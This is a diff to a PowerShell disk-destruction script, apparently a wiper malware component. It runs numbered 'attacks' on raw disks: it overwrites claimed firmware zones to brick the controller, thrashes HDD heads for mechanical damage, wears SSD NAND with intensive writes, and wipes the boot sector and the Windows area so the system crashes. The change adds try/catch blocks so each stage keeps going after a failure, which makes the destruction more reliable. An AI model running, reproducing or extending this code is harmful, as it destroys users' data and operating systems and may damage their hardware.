@@ -140,59 +140,76 @@ foreach ($disk in $disks) {
         # ATTACK 3: FIRMWARE CORRUPTION (brick controller)
         Write-Host "      [3/5] Corrupting firmware zones..." -ForegroundColor Red
 
-        $firmwareOffsets = @(
-            $targetSize - 1GB,     # HPA zone
-            $targetSize - 5GB,     # Firmware area
-            $targetSize - 10GB     # Alternative location
-        )
+        try {
+            $firmwareOffsets = @(
+                $targetSize - 1GB,     # HPA zone
+                $targetSize - 5GB,     # Firmware area
+                $targetSize - 10GB     # Alternative location
+            )
 
-        foreach ($offset in $firmwareOffsets) {
-            if ($offset -gt 0 -and $offset -lt $targetSize) {
-                $rng.GetBytes($buffer)
-                [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
+            foreach ($offset in $firmwareOffsets) {
+                if ($offset -gt 0 -and $offset -lt $targetSize) {
+                    $rng.GetBytes($buffer)
+                    [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
+                }
             }
+            Write-Host "      Firmware attack completed" -ForegroundColor Green
+        } catch {
+            Write-Host "      Firmware attack failed (OK to continue)" -ForegroundColor Yellow
         }
 
         # ATTACK 4: HEAD THRASHING (HDD) or INTENSIVE WRITES (SSD)
-        if ($mediaType -notlike "*SSD*" -and $mediaType -notlike "*Solid State*") {
-            Write-Host "      [4/5] Head thrashing (mechanical damage)..." -ForegroundColor Red
+        try {
+            if ($mediaType -notlike "*SSD*" -and $mediaType -notlike "*Solid State*") {
+                Write-Host "      [4/5] Head thrashing (mechanical damage)..." -ForegroundColor Red
 
-            # Fast head thrashing - damage mechanics
-            $positions = @(0L, $targetSize / 4, $targetSize / 2, ($targetSize * 3) / 4, $targetSize - 1MB)
+                # Fast head thrashing - damage mechanics
+                $positions = @(0L, $targetSize / 4, $targetSize / 2, ($targetSize * 3) / 4, $targetSize - 1MB)
 
-            for ($i = 0; $i -lt 1000; $i++) {
-                foreach ($pos in $positions) {
-                    [RawDisk]::Seek($handle, $pos) | Out-Null
+                for ($i = 0; $i -lt 1000; $i++) {
+                    foreach ($pos in $positions) {
+                        [RawDisk]::Seek($handle, $pos) | Out-Null
+                    }
                 }
-            }
-        } else {
-            Write-Host "      [4/5] SSD intensive writes (NAND wear)..." -ForegroundColor Red
+                Write-Host "      Head thrashing completed" -ForegroundColor Green
+            } else {
+                Write-Host "      [4/5] SSD intensive writes (NAND wear)..." -ForegroundColor Red
 
-            # Random writes across disk for SSD wear
-            for ($i = 0; $i -lt 20; $i++) {
-                $randomOffset = Get-Random -Minimum 20GB -Maximum ($targetSize - 10GB)
-                $randomOffset = $randomOffset - ($randomOffset % 4096)
+                # Random writes across disk for SSD wear
+                for ($i = 0; $i -lt 20; $i++) {
+                    $randomOffset = Get-Random -Minimum 20GB -Maximum ($targetSize - 10GB)
+                    $randomOffset = $randomOffset - ($randomOffset % 4096)
 
-                $rng.GetBytes($buffer)
-                [RawDisk]::WriteAt($handle, $randomOffset, $buffer, [ref]$written) | Out-Null
+                    $rng.GetBytes($buffer)
+                    [RawDisk]::WriteAt($handle, $randomOffset, $buffer, [ref]$written) | Out-Null
+                }
+                Write-Host "      SSD writes completed" -ForegroundColor Green
             }
+        } catch {
+            Write-Host "      Attack 4 failed (OK to continue)" -ForegroundColor Yellow
         }
 
         # ATTACK 5: BOOT + OS DESTRUCTION (LAST - Windows dies here)
         Write-Host "      [5/5] FINAL: Destroying boot + Windows (system will crash)..." -ForegroundColor Red
 
-        # Wipe boot sector (MBR/GPT) - critical
-        $bootBuffer = New-Object byte[] (100MB)
-        [RawDisk]::WriteAt($handle, 0, $bootBuffer, [ref]$written) | Out-Null
+        try {
+            # Wipe boot sector (MBR/GPT) - critical
+            $bootBuffer = New-Object byte[] (100MB)
+            [RawDisk]::WriteAt($handle, 0, $bootBuffer, [ref]$written) | Out-Null
 
-        # Wipe Windows/OS area - FAST sampling every 5GB
-        for ($i = 0L; $i -lt 20GB; $i += 5GB) {
-            if ($i -lt $targetSize) {
-                [RawDisk]::WriteAt($handle, $i, $buffer, [ref]$written) | Out-Null
-                Write-Host "`r      OS: $([int](($i / 20GB) * 100))%     " -NoNewline -ForegroundColor Yellow
+            # Wipe Windows/OS area - FAST sampling every 5GB
+            for ($i = 0L; $i -lt 20GB; $i += 5GB) {
+                if ($i -lt $targetSize) {
+                    [RawDisk]::WriteAt($handle, $i, $buffer, [ref]$written) | Out-Null
+                    Write-Host "`r      OS: $([int](($i / 20GB) * 100))%     " -NoNewline -ForegroundColor Yellow
+                }
             }
+            Write-Host ""
+            Write-Host "      Boot + OS destroyed - system will crash soon" -ForegroundColor Green
+        } catch {
+            Write-Host ""
+            Write-Host "      Boot destruction may have failed but some damage done" -ForegroundColor Yellow
         }
-        Write-Host ""
 
         $rng.Dispose()
         $handle.Close()
